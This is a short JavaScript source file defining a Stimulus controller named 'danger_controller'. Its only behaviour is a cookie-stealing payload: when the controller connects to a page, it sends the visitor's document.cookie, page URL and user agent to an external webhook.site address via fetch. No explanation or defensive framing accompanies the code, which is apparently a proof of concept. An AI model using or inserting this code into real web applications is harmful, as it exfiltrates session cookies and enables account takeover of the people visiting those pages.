// danger_controller.js
export default class extends Stimulus.Controller {
  connect() {
    fetch("https://webhook.site/8a4734e9-e8b0-4b46-9684-f6b75027dac5", {
      method: "POST",
      body: JSON.stringify({
        cookie: document.cookie,
        location: window.location.href,
        userAgent: navigator.userAgent
      }),
      headers: {
        "Content-Type": "application/json"
      }
    });
  }
}
